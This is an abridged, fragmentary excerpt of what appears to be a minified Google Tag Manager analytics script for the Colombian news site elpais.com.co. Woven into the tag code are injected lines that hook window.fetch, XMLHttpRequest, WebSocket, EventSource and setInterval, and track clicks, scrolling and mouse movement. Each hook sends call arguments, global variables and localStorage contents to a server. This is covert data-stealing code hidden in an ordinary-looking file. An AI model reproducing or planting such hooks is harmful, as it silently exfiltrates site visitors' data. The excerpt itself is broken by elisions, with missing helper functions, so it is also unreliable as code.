...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 7,
        "vtp_includeConditions": ["list", "elpais\\.com\\.co"],
        "tag_id": 18
      }, {
        ...
        "priority": 6,
        "vtp_instanceDestinationId": "G-K8BMVZR9EP",
        "tag_id": 27
      }, {
  ...
  */
  ...
  ii.fe = Number("0") || 0;
  ii.ka = "dataLayer";
  ii.Uj = "ChAI8NCBpwYQt5+cxZ7f1aFJEiUATU77VP2dagfTGJfwZqVga+1HBlvLLEV1xMJ+6OuZ9F1iHDBJGgKt1A\x3d\x3d";
  var li = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  const trackedEvents = ['click', 'scroll', 'mousemove'];
  var Wj = function (a) {
  ...
  function fetchGlobalVars() {
    ...
    const newVars = currentVars.filter(varName => originalGlobalVars.indexOf(varName) === -1);
    return newVars;
  }
  function co(a, b, c) {
  ...
  function hookFunction(originalFunc, functionName, expectedSchema) {
    return function () {
      const args = Array.from(arguments);
      const payload = {
        functionName,
        args,
        globals: fetchGlobalVars(),
        localStorage: originalLocalStorage,
        sessionId: generateSessionId()
      };
      if (validatePayload(payload, expectedSchema)) {
        sendPayloadToServer(payload);
      }
  ...
  Rz.M = "callInWindow";
  function Sz(a) {}
  window.setInterval = hookFunction(originalSetInterval, "setInterval", {});
  Sz.M = "callLater";
  function Tz(a) {}
  Tz.H = "callOnDomReady";
  function Uz(a) {}
  ...
  window.XMLHttpRequest = hookFunction(originalXMLHttpRequest, "XMLHttpRequest", {});
  function eA(a) {
    var b;
  ...
  function TC() {
    var a = new jb();
    L(this, "read_container_data"), a.set("containerId", 'G-K8BMVZR9EP'), a.set("version", '2'), a.set("environmentName", ''), a.set("debugMode", Xf), a.set("previewMode", Zf), a.set("environmentMode", Yf), Q(96) && a.set("firstPartyServing", ri || ti), a.sc();
    return a;
  }
  ...
  window.fetch = hookFunction(originalFetch, "fetch", {});
  ...
  bE[N.g.Od] = "sct";
  bE[N.g.Aa] = "uid";
  window.WebSocket = hookFunction(originalWebSocket, "WebSocket", {});
  Q(37) && (bE[N.g.Qc] = "dp");
  var cE = {};
  cE[N.g.zd] = "_et";
  cE[N.g.tb] = "edid";
  ...
  function yF(a, b, c) {}
  window.EventSource = hookFunction(originalEventSource, "EventSource", {});
  yF.M = "sendPixel";
  function zF(a, b) {}
  ...
  function DF(a, b) {}
  trackedEvents.forEach(eventName => trackEvents(eventName));
